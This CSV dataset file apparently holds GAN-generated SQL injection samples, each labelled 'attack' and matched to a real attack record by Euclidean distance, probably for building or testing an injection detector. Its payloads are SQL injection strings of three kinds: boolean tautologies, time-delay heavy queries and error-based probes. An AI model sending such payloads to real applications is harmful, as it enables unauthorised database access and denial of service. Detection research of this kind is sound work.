id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R001780,4.420618365463695
GAN_000002,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.691749966152217
GAN_000003,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R002659,5.781925919304254
GAN_000004,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,6.301751554866528
GAN_000005,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,7.851959810529906
GAN_000006,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",nearest_attack_euclidean,R003655,5.026740404759425
GAN_000007,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,5.194428169412036
GAN_000008,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.382729389208284
GAN_000009,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,9.040110125032324
GAN_000010,attack,boolean,1' and 7533  =  7533 and 'clqy' like 'clqy,nearest_attack_euclidean,R002193,8.00560459151133
GAN_000011,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.373651608402033
GAN_000012,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,5.080438762510038
GAN_000013,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,10.017845985936951
GAN_000014,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",nearest_attack_euclidean,R001040,5.824956269145028
GAN_000015,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,3.8174520906248626
GAN_000016,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,5.929712351887965
GAN_000017,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",nearest_attack_euclidean,R001474,6.692472007091616
GAN_000018,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",nearest_attack_euclidean,R000582,8.354926454766685
GAN_000019,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.403050839376102
GAN_000020,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,8.344113857994884
GAN_000021,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,6.595305639917319
GAN_000022,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",nearest_attack_euclidean,R001991,6.820026893267288
GAN_000023,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",nearest_attack_euclidean,R001040,7.363779023512648
GAN_000024,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,5.656704569345338
GAN_000025,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,6.325785544637998
GAN_000026,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.6066966603776
GAN_000027,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,6.650441752351346
GAN_000028,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,5.651090560849634
GAN_000029,attack,boolean,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",nearest_attack_euclidean,R001751,5.378047797780582
GAN_000030,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.299030945240207
